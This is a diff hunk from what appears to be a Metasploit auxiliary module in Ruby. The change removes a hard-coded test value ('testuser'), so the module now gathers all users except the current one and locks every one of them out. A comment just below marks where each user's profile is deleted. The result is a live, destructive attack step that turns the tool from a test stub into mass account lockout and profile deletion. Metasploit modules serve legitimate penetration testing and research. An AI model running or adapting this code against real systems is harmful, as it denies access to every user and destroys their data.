@@ -75,9 +75,9 @@ class MetasploitModule < Msf::Auxiliary
       print_error("Could not retrieve users")
       return
     end
-    users = doc['member'].map { |u| u['UserName'] }.select { |u| u != current_user }
-    users = ['testuser']
 
+    # list of all users to be dissabled
+    users = doc['member'].map { |u| u['UserName'] }.select { |u| u != current_user }
     print_status("Locking out users: #{users.join(',')}")
     users.each do |user|
       # delete user's profile
